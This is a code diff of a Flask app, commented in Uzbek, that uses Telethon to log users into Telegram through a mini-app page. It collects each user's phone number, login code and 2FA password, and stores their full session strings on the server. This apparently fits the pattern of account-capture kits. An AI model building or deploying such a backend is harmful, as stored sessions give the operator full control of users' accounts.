@@ -47,6 +47,9 @@ def index():
 def miniapp():
     return render_template("login.html")
 
+
+
+
 @app.route("/send_code", methods=["POST"])
 def send_code():
     phone = request.json.get("phone")
@@ -59,6 +62,7 @@ def send_code():
         try:
             sent = await client.send_code_request(phone)
             session_string = client.session.save()
+            # 🔐 TEMP SESSION + CODE SAQLAYMIZ
             save_temp_session(phone, session_string)
             return sent.phone_code_hash
         finally:
@@ -79,55 +83,68 @@ def send_code():
         print("SEND_CODE ERROR:", repr(e))
         return jsonify({"status": "error", "message": str(e)}), 500
 
-@app.route("/verify_code", methods=["POST"])
 
+
+
+@app.route("/verify_code", methods=["POST"])
 def verify_code():
     phone = request.json.get("phone")
     code = request.json.get("code")
-    password = request.json.get("password")  # agar bo‘lsa
+    password = request.json.get("password")  # 2FA bo‘lsa
+
+    if not phone or not code:
+        return jsonify({"status": "error", "message": "Ma’lumot yetarli emas"}), 400
 
     phone_code_hash = get_login_code(phone)
     session_string = get_temp_session(phone)
 
     if not phone_code_hash or not session_string:
-        return jsonify({"status": "error", "message": "Sessiya eskirgan"}), 400
+        return jsonify({
+            "status": "error",
+            "message": "Sessiya eskirgan. Qayta kod so‘rang."
+        }), 400
 
     async def _verify():
         client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
         await client.connect()
-
         try:
-            await client.sign_in(
-                phone=phone,
-                code=code,
-                phone_code_hash=phone_code_hash
-            )
-        except SessionPasswordNeededError:
-            if not password:
-                return "2fa_required", None
-            await client.sign_in(password=password)
+            try:
+                await client.sign_in(
+                    phone=phone,
+                    code=code,
+                    phone_code_hash=phone_code_hash
+                )
+            except SessionPasswordNeededError:
+                if not password:
+                    return ("2fa_required", None)
+                await client.sign_in(password=password)
 
-        user = await client.get_me()
-        session = client.session.save()
-        await client.disconnect()
-        return user.id, session
+            user = await client.get_me()
+            final_session = client.session.save()
+            return (user.id, final_session)
+        finally:
+            await client.disconnect()
 
     try:
         result = asyncio.run(_verify())
         if result[0] == "2fa_required":
             return jsonify({"status": "2fa_required"})
 
-        user_id, session_string = result
-        save_session(user_id, session_string)
+        user_id, final_session = result
+        # 💾 YAKUNIY SESSION
+        save_session(user_id, final_session)
+        # 🧹 TEMP MA’LUMOTLARNI O‘CHIRAMIZ
         delete_login_code(phone)
         delete_temp_session(phone)
-        return jsonify({"status": "ok"})
+
+        return jsonify({"status": "ok"}), 200
 
     except PhoneCodeInvalidError:
-        return jsonify({"status": "error", "message": "Kod noto‘g‘ri"})
+        return jsonify({"status": "error", "message": "Kod noto‘g‘ri"}), 400
 
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
+        print("VERIFY_CODE ERROR:", repr(e))
+        return jsonify({"status": "error", "message": "Server xatosi"}), 500
 
 
 
